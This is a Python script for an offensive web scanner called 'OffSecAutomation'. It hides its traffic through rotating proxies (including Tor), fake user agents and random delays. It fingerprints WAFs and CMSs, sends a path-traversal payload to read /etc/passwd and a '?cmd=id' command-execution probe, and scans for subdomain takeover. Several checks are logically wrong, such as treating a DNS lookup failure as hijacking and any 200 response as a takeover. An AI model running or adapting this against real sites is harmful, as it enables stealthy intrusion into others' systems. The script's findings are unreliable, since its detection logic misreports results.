import requests
import random
import time
import socket
import threading
import re
import json

PROXIES = ["socks5://127.0.0.1:9050", "http://proxy.example.com:8080"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]
TIME_DELAY = [1, 3, 5]

class OffSecAutomation:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers = {"User-Agent": random.choice(USER_AGENTS)}

    def rotate_ip(self):
        proxy = random.choice(PROXIES)
        self.session.proxies = {"http": proxy, "https": proxy}

    def stealth_request(self, url):
        self.rotate_ip()
        time.sleep(random.choice(TIME_DELAY))
        return self.session.get(url, timeout=5)

    def waf_detection(self):
        waf_patterns = ["cloudflare", "incapsula", "sucuri"]
        res = self.stealth_request(self.target)
        for pattern in waf_patterns:
            if pattern in res.text.lower():
                print(f"[!] WAF Detected: {pattern}")
                return True
        print("[+] No WAF detected.")
        return False

    def cms_fingerprinting(self):
        cms_patterns = {
            "WordPress": "wp-content",
            "Joomla": "Joomla!",
            "Drupal": "Drupal.settings"
        }
        res = self.stealth_request(self.target)
        for cms, pattern in cms_patterns.items():
            if pattern in res.text:
                print(f"[+] CMS Detected: {cms}")
                return cms
        print("[-] No CMS detected.")
        return None

    def exploit_chain(self):
        lfi_payload = f"{self.target}/?file=../../../../etc/passwd"
        rce_payload = f"{self.target}/?cmd=id"

        if "root:x:" in self.stealth_request(lfi_payload).text:
            print("[!] LFI Exploit Successful!")
            if "uid=" in self.stealth_request(rce_payload).text:
                print("[!] RCE Achieved via LFI Chaining!")

    def dns_hijack_scan(self):
        try:
            original_ip = socket.gethostbyname(self.target)
            print(f"[+] Checking DNS hijack: {self.target} resolves to {original_ip}")
        except socket.gaierror:
            print("[!] Possible DNS hijack detected!")

    def subdomain_takeover_scan(self):
        subdomains = ["admin", "test", "dev"]
        for sub in subdomains:
            url = f"http://{sub}.{self.target}"
            res = self.stealth_request(url)
            if res.status_code == 200 and "404" not in res.text:
                print(f"[!] Subdomain {url} is vulnerable to takeover!")

    def start_scan(self):
        print(f"[*] Scanning {self.target}...")
        self.waf_detection()
        self.cms_fingerprinting()
        self.dns_hijack_scan()
        self.subdomain_takeover_scan()
        self.exploit_chain()

if __name__ == "__main__":
    target = "example.com"
    scanner = OffSecAutomation(target)
    scanner.start_scan()
